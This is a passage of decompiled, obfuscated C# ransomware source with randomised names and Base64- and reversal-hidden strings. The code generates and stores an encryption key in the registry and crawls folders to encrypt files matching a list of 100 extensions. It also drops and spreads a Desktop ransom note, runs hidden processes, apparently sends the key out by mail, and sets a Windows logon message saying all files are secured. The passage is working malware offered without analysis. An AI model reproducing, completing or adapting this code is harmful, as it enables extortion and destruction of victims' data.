		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!qyAhWYLrtiOtS.Contains(currentDirectory))
			{
				qyAhWYLrtiOtS.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396363))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396363)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396346)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !qyAhWYLrtiOtS.Contains(text6) && text6 != getString_0(107396293) && text6 != getString_0(107396304) && text6 != getString_0(107396251))
								{
									qyAhWYLrtiOtS.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396222)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && text6 != getString_0(107396293) && text6 != getString_0(107396304) && text6 != getString_0(107396251))
								{
									LprhUPIkKugxdZ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396713)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396700))
						{
							jJkNZEReBTMkuY = getString_0(107396859);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396723))
						{
							jJkNZEReBTMkuY = getString_0(107396682);
						}
					}
					if (text3.Contains(getString_0(107396677)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396700))
						{
							qqVKUcwYqRObMU = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396723))
						{
							qqVKUcwYqRObMU = true;
						}
					}
					if (text3.Contains(getString_0(107396692)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396700))
						{
							hIFJbdEMJudY = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396723))
						{
							hIFJbdEMJudY = false;
						}
					}
					if (text3.Contains(getString_0(107396647)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396700))
						{
							DHzgvUPuaGcJ = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396723))
						{
							DHzgvUPuaGcJ = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107396618) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (jJkNZEReBTMkuY == getString_0(107396682))
		{
			diimiJiwgQwlyW();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && EekjbAOphgGS)
			{
				try
				{
					Thread thread4 = new Thread(JjkubgNPsnZGJJX.qhFCBUEZMkREk);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			spDXxUcNpZnQ(getString_0(107396573), XtEtTgUvwHGMW(getString_0(107396592)));
		}
		SecureString secureString = new SecureString();
		if (bfLHAxJfKaXqSS == getString_0(107396682))
		{
			if (!CuCRTFRskQOdHM)
			{
				kEFVKbULbQeU = LvsBHTRNEJVVT.CuYVABsgDAuzvtB(32);
				HZePHYGbpexu = LvsBHTRNEJVVT.NVvkzdoIwRWjWo();
			}
		}
		else
		{
			kEFVKbULbQeU = getString_0(107396487);
		}
		if (!CuCRTFRskQOdHM)
		{
			jdzEbvPutazU = ZMseRpqIbtGDsKWQ.UEhYhvKzXiJ(kEFVKbULbQeU + HZePHYGbpexu);
		}
		else
		{
			try
			{
				jbPwnYxxejKK();
				kEFVKbULbQeU = FLLRBMBfzt(KGczbSpbMzb(VfmZCqDrTnYlT, jjPIQkyhDHD(fOCEhEMJTPme)));
				VfmZCqDrTnYlT = null;
				HZePHYGbpexu = FLLRBMBfzt(new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
				jdzEbvPutazU = FLLRBMBfzt(FfXSrTItXwhd);
			}
			catch (Exception)
			{
				CuCRTFRskQOdHM = false;
				kEFVKbULbQeU = LvsBHTRNEJVVT.CuYVABsgDAuzvtB(32);
				HZePHYGbpexu = LvsBHTRNEJVVT.NVvkzdoIwRWjWo();
				jdzEbvPutazU = ZMseRpqIbtGDsKWQ.UEhYhvKzXiJ(kEFVKbULbQeU + HZePHYGbpexu);
			}
		}
		try
		{
			if (!MFCrMNyVwftIF)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(XtEtTgUvwHGMW(getString_0(107395962)));
				if (registryKey != null)
				{
					registryKey.SetValue(XtEtTgUvwHGMW(getString_0(107395917)) + (registryKey.ValueCount + 1), jdzEbvPutazU);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(XtEtTgUvwHGMW(getString_0(107395962)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(XtEtTgUvwHGMW(getString_0(107395917)) + (registryKey.ValueCount + 1), jdzEbvPutazU);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			IeiMhxonCbw = true;
		}
		if (wvVqxnBdrKxaCFZ == getString_0(107396859))
		{
			LCcEyjomwPZlQ();
		}
		if (QNcazMBOlHTTBH)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), mqQgvSYgrlnpSvAge)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), mqQgvSYgrlnpSvAge), string.Concat(XtEtTgUvwHGMW(getString_0(107395876)), new WebClient().DownloadString(XtEtTgUvwHGMW(getString_0(107395883))), getString_0(107395810), XtEtTgUvwHGMW(getString_0(107395805)), DateTime.Now, getString_0(107395810), XtEtTgUvwHGMW(getString_0(107395796)), jdzEbvPutazU));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), mqQgvSYgrlnpSvAge), getString_0(107395707) + jdzEbvPutazU);
				}
			}
			catch (Exception ex11)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107396190) + ex11.Message + getString_0(107395810));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!fiNlreSRwIMD || IeiMhxonCbw)
		{
			qyGtvptaEJy(jdzEbvPutazU);
		}
		try
		{
			try
			{
				if (qqVKUcwYqRObMU)
				{
					Console.WriteLine(getString_0(107396173));
				}
			}
			catch
			{
			}
			XNBzvxsMHCm(new string[1] { getString_0(107396092) }, new string[100]
			{
				getString_0(107396115),
				getString_0(107396110),
				getString_0(107396073),
				getString_0(107396064),
				getString_0(107396059),
				getString_0(107396086),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107396029),
				getString_0(107396056),
				getString_0(107396047),
				getString_0(107396010),
				getString_0(107396001),
				getString_0(107395996),
				getString_0(107396023),
				getString_0(107396018),
				getString_0(107396013),
				getString_0(107395976),
				getString_0(107395967),
				getString_0(107395994),
				getString_0(107395989),
				getString_0(107395984),
				getString_0(107395979),
				getString_0(107395430),
				getString_0(107395425),
				getString_0(107395420),
				getString_0(107395447),
				getString_0(107395442),
				getString_0(107395437),
				getString_0(107395400),
				getString_0(107395395),
				getString_0(107395390),
				getString_0(107395413),
				getString_0(107395408),
				getString_0(107395403),
				getString_0(107395366),
				getString_0(107396081),
				getString_0(107395361),
				getString_0(107396039),
				getString_0(107395384),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107395337),
				getString_0(107395332),
				getString_0(107395327),
				getString_0(107395354),
				getString_0(107395349),
				getString_0(107395344),
				getString_0(107395339),
				getString_0(107395302),
				getString_0(107395297),
				getString_0(107395292),
				getString_0(107395319),
				getString_0(107395314),
				getString_0(107395309),
				getString_0(107395272),
				getString_0(107395263),
				getString_0(107395290),
				getString_0(107395281),
				getString_0(107395236),
				getString_0(107395361),
				getString_0(107395255),
				getString_0(107395246),
				getString_0(107395205),
				getString_0(107395196),
				getString_0(107395219),
				getString_0(107395690),
				getString_0(107395685),
				getString_0(107395676),
				getString_0(107395699),
				getString_0(107395658),
				getString_0(107395653),
				getString_0(107395648),
				getString_0(107395643),
				getString_0(107395670),
				getString_0(107395665),
				getString_0(107395660),
				getString_0(107395619),
				getString_0(107395614),
				getString_0(107395641),
				getString_0(107395636),
				getString_0(107395631),
				getString_0(107395594),
				getString_0(107395585),
				getString_0(107395608),
				getString_0(107395603),
				getString_0(107395395),
				getString_0(107395598),
				getString_0(107395561),
				getString_0(107395556),
				getString_0(107395551),
				getString_0(107395578),
				getString_0(107395569),
				getString_0(107395564),
				getString_0(107395527),
				getString_0(107395518),
				getString_0(107395545),
				getString_0(107395540)
			}, new string[0], kEFVKbULbQeU, getString_0(107395535));
		}
		catch (Exception ex6)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107395490) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!fiNlreSRwIMD || IeiMhxonCbw)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465));
					streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107394920)).Replace(getString_0(107389718), ySVDzMAbizHUS.yinVnqLUaFwpJQJ()).Replace(getString_0(107389709), Environment.UserName).Replace(getString_0(107389660), Environment.MachineName)
						.Replace(getString_0(107389639), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395810));
					if (AbzhPXXcXCCr || !MFCrMNyVwftIF)
					{
						streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107389654)));
						streamWriter.WriteLine(jdzEbvPutazU);
					}
					if (mWfsjXfVaDjgsa == getString_0(107396682))
					{
						streamWriter.WriteLine(getString_0(107395810));
						streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107389605)) + Convert.ToString(lBBLtRfPsPV.Count));
					}
					if (eSjMTjCatON)
					{
						streamWriter.WriteLine(getString_0(107395810));
						streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107390072)));
						streamWriter.WriteLine(ySVDzMAbizHUS.yinVnqLUaFwpJQJ());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465));
					if (!text7.Contains(jdzEbvPutazU) && !MFCrMNyVwftIF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465), getString_0(107390039) + jdzEbvPutazU);
					}
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107390010) + ex6.Message + getString_0(107395810));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in rEUVMKgscr)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107395465)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465), item + getString_0(107395465), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465));
						if (!text7.Contains(jdzEbvPutazU) && !MFCrMNyVwftIF)
						{
							File.AppendAllText(item + getString_0(107395465), getString_0(107390039) + jdzEbvPutazU);
						}
					}
				}
				catch (Exception ex6)
				{
					if (hIFJbdEMJudY)
					{
						try
						{
							File.AppendAllText(LImNkSPhwOOQHW, getString_0(107390010) + ex6.Message + getString_0(107395810));
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!EMUmjShvoRjVxRTfB && num > 10)
				{
					break;
				}
			}
		}
		if ((YWANRiRWiwxS == getString_0(107396859) && !fiNlreSRwIMD) || (YWANRiRWiwxS == getString_0(107396859) && IeiMhxonCbw))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389965)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389965));
					streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107389932)).Replace(getString_0(107389718), ySVDzMAbizHUS.yinVnqLUaFwpJQJ()).Replace(getString_0(107389709), Environment.UserName).Replace(getString_0(107389660), Environment.MachineName)
						.Replace(getString_0(107389639), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395810));
					if (AbzhPXXcXCCr || !MFCrMNyVwftIF)
					{
						streamWriter.WriteLine(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107389883))));
						streamWriter.WriteLine(jdzEbvPutazU + XtEtTgUvwHGMW(getString_0(107389842)));
					}
					if (mWfsjXfVaDjgsa == getString_0(107396682))
					{
						streamWriter.WriteLine(getString_0(107395810));
						streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107389285)) + XtEtTgUvwHGMW(getString_0(107389605)) + Convert.ToString(lBBLtRfPsPV.Count) + XtEtTgUvwHGMW(getString_0(107389842)));
					}
					if (eSjMTjCatON)
					{
						streamWriter.WriteLine(getString_0(107395810));
						streamWriter.WriteLine(XtEtTgUvwHGMW(getString_0(107390072)));
						streamWriter.WriteLine(ySVDzMAbizHUS.yinVnqLUaFwpJQJ());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465));
					if (!text7.Contains(jdzEbvPutazU) && !MFCrMNyVwftIF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389965), XtEtTgUvwHGMW(getString_0(107389285)) + getString_0(107390039) + jdzEbvPutazU + XtEtTgUvwHGMW(getString_0(107389842)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107389224) + ex6.Message + getString_0(107395810));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (MNBzqiuQfRJQcYj == getString_0(107396859))
		{
			try
			{
				if (mWfsjXfVaDjgsa == getString_0(107396682))
				{
					ySVDzMAbizHUS.XXsyNoNQwAhAIs(getString_0(107389199), getString_0(107389162), getString_0(107389149), string.Concat(XtEtTgUvwHGMW(getString_0(107395876)), new WebClient().DownloadString(XtEtTgUvwHGMW(getString_0(107395883))), getString_0(107389172), XtEtTgUvwHGMW(getString_0(107395805)), DateTime.Now, getString_0(107395810), XtEtTgUvwHGMW(getString_0(107389167)), Convert.ToString(lBBLtRfPsPV.Count), getString_0(107395810), XtEtTgUvwHGMW(getString_0(107395796)), jdzEbvPutazU));
				}
				else
				{
					ySVDzMAbizHUS.XXsyNoNQwAhAIs(getString_0(107389199), getString_0(107389162), getString_0(107389149), string.Concat(XtEtTgUvwHGMW(getString_0(107395876)), new WebClient().DownloadString(XtEtTgUvwHGMW(getString_0(107395883))), getString_0(107389172), XtEtTgUvwHGMW(getString_0(107395805)), DateTime.Now, getString_0(107395810), XtEtTgUvwHGMW(getString_0(107389167)), Convert.ToString(lBBLtRfPsPV.Count), getString_0(107395810), XtEtTgUvwHGMW(getString_0(107395796)), jdzEbvPutazU));
				}
			}
			catch
			{
			}
		}
		if (xZEDYYkzZNtnw == getString_0(107396859))
		{
			try
			{
				uhckmkjrYoi.icRLOzvUHml(new Uri(getString_0(107389086)));
			}
			catch
			{
			}
		}
		if (YWANRiRWiwxS == getString_0(107396682) && !fiNlreSRwIMD)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465)))
				{
					Process.Start(XtEtTgUvwHGMW(getString_0(107389085)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395465));
				}
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(getString_0(107389060));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107389543) + ex6.Message + getString_0(107395810));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (YWANRiRWiwxS == getString_0(107396859) && !fiNlreSRwIMD)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389965)))
				{
					Process.Start(XtEtTgUvwHGMW(getString_0(107389522)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389965));
				}
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(getString_0(107389473));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (hIFJbdEMJudY)
				{
					try
					{
						File.AppendAllText(LImNkSPhwOOQHW, getString_0(107389444) + ex6.Message + getString_0(107395810));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (wvVqxnBdrKxaCFZ == getString_0(107396859))
		{
			if (kvwQzPxIqIlk == getString_0(107396859) && !string.IsNullOrEmpty(VyRGExDcVMKv) && !string.IsNullOrEmpty(DsHDKKZPqyRV))
			{
				quaIrXBWxfUit(VyRGExDcVMKv, DsHDKKZPqyRV);
			}
			else
			{
				quaIrXBWxfUit(getString_0(107389423), getString_0(107389394));
			}
		}
		if (TUGYFpvgdQx != getString_0(107388704))
		{
			fNSTzMmNmz(TUGYFpvgdQx);
		}
		if (!string.IsNullOrEmpty(FalYYrscvz))
		{
			try
			{
				File.Delete(FalYYrscvz);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396363))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396363)));
			}
		}
		catch (Exception ex11)
		{
			try
			{
				File.AppendAllText(LImNkSPhwOOQHW, getString_0(107388719) + ex11.Message);
			}
			catch (Exception)
			{
			}
		}
		if (hIFJbdEMJudY)
		{
			try
			{
				File.AppendAllText(LImNkSPhwOOQHW, getString_0(107388642));
			}
			catch (Exception)
			{
			}
		}
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		string contents = string.Format(getString_0(107388661), elapsed.Hours, elapsed.Minutes, elapsed.Seconds, elapsed.Milliseconds / 10);
		if (hIFJbdEMJudY)
		{
			try
			{
				File.AppendAllText(LImNkSPhwOOQHW, contents);
			}
			catch (Exception)
			{
			}
		}
		if (!KDRBaizPAVVdHDL().Contains(getString_0(107388600)))
		{
			try
			{
				DxkPRjlZwqzF(ApqYNCacJvgq);
			}
			catch (Exception)
			{
			}
			List<string> source = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
				{
					spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		}
		else
		{
			List<string> source2 = bruHyzeehnYYe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					spDXxUcNpZnQ(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107386592))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (AgnlixIASzPo == getString_0(107388595))
		{
			KlGYVRewNV();
		}
	}

	public static void GgtGCLfdMyde()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(XtEtTgUvwHGMW(WSyblavDtYINn(getString_0(107388554))), XtEtTgUvwHGMW(getString_0(107389423)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int ilvvDnPDEnGoFk(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> ddQKitSedfEpH(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((LprhUPIkKugxdZ.Count > 0 && LprhUPIkKugxdZ.Contains(text)) || ((text.Contains(getString_0(107388944)) || text.Contains(getString_0(107388919)) || text.Contains(getString_0(107388886)) || text.ToLower().Contains(getString_0(107388837)) || text.ToLower().Contains(getString_0(107388856)) || text.Contains(getString_0(107388799)) || text.Contains(getString_0(107388266)) || text.ToLower().Contains(getString_0(107388253)) || text.ToLower().Contains(getString_0(107388272)) || text.ToLower().Contains(getString_0(107388235)) || text.ToLower().Contains(getString_0(107388194)) || text.ToLower().Contains(getString_0(107388209)) || text.ToLower().Contains(getString_0(107388164)) || text.ToLower().Contains(getString_0(107388183)) || text.ToLower().Contains(getString_0(107388130))) && !text.Contains(XtEtTgUvwHGMW(getString_0(107388105)))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0235;
			}
			catch
			{
			}
			continue;
			IL_0235:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388064)) && !fileInfo.FullName.Contains(getString_0(107388079)) && !fileInfo.FullName.Contains(getString_0(107388030)) && !fileInfo.FullName.Contains(getString_0(107388045)) && !fileInfo.FullName.Contains(getString_0(107388508)) && !fileInfo.FullName.Contains(getString_0(107388523)) && !fileInfo.FullName.Contains(getString_0(107388506)) && !fileInfo.FullName.Contains(getString_0(107388457)) && !fileInfo.FullName.Contains(getString_0(107388444)) && !fileInfo.FullName.Contains(getString_0(107388423)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388442)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388429)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388380)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388395)) && !fileInfo.FullName.Contains(XtEtTgUvwHGMW(getString_0(107388378))) && !fileInfo.FullName.Contains(getString_0(107388321)) && !fileInfo.FullName.Contains(getString_0(107388340)) && !fileInfo.FullName.Contains(getString_0(107396363)) && !fileInfo.FullName.Contains(getString_0(107388295)) && !fileInfo.FullName.EndsWith(getString_0(107395535)) && !fileInfo.FullName.EndsWith(getString_0(107388302)) && !fileInfo.FullName.EndsWith(getString_0(107387753)) && !fileInfo.FullName.EndsWith(getString_0(107387748)) && !fileInfo.FullName.EndsWith(getString_0(107387743)) && !fileInfo.FullName.Contains(getString_0(107387770)) && !fileInfo.FullName.Contains(rwyuADDQdblNA) && !fileInfo.FullName.Contains(LImNkSPhwOOQHW) && !fileInfo.FullName.Contains(mqQgvSYgrlnpSvAge))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(rqLFEsCDTMyF) * 1024.0 * 1024.0 && oLUeHhoXSrXL == getString_0(107396859))
						{
							list.Add(fileInfo.FullName);
							HFQDcpWJIQ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && oLUeHhoXSrXL == getString_0(107396682))
						{
							list.Add(fileInfo.FullName);
							HFQDcpWJIQ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void diimiJiwgQwlyW()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387721));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!qyAhWYLrtiOtS.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387700), getString_0(107396781)).Replace(getString_0(107387695), getString_0(107387700))
					.Replace(getString_0(107387654), getString_0(107389086))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					qyAhWYLrtiOtS.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387700), getString_0(107396781)).Replace(getString_0(107387695), getString_0(107387700))
						.Replace(getString_0(107387654), getString_0(107389086))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387649), getString_0(107389086)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string spDXxUcNpZnQ(string fwasRQeBYDpjCju = "", string rPXEtXyydonzIIfRg = "")
	{
		string result = getString_0(107389086);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = fwasRQeBYDpjCju,
				Arguments = rPXEtXyydonzIIfRg,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void SXgAmFCHFbhKk(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387672),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string WSyblavDtYINn(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string XtEtTgUvwHGMW(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void ovoZeAhURgqZH(string TSFbGQlhQtcPJ = "", string UTlHyFRcOBLQMFN = "SW5mb3JtYXRpb24uLi4=", string UaQVNdxNIF = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		TSFbGQlhQtcPJ = WSyblavDtYINn(getString_0(107387623));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(XtEtTgUvwHGMW(TSFbGQlhQtcPJ), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(XtEtTgUvwHGMW(getString_0(107387526)), XtEtTgUvwHGMW(UTlHyFRcOBLQMFN));
				registryKey.SetValue(XtEtTgUvwHGMW(getString_0(107388005)), XtEtTgUvwHGMW(UaQVNdxNIF));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			TSFbGQlhQtcPJ = WSyblavDtYINn(getString_0(107387976));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(XtEtTgUvwHGMW(TSFbGQlhQtcPJ), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(XtEtTgUvwHGMW(getString_0(107387871)), XtEtTgUvwHGMW(UTlHyFRcOBLQMFN));
				registryKey.SetValue(XtEtTgUvwHGMW(getString_0(107387838)), XtEtTgUvwHGMW(UaQVNdxNIF));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void LCcEyjomwPZlQ()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (kvwQzPxIqIlk == getString_0(107396859) && !string.IsNullOrEmpty(VyRGExDcVMKv) && !string.IsNullOrEmpty(DsHDKKZPqyRV))
				{
					ovoZeAhURgqZH(getString_0(107389086), VyRGExDcVMKv, DsHDKKZPqyRV);
				}
				else
				{
					ovoZeAhURgqZH(getString_0(107389086), getString_0(107389423), getString_0(107389394));
				}
			}
		}
		catch
		{
		}
	}

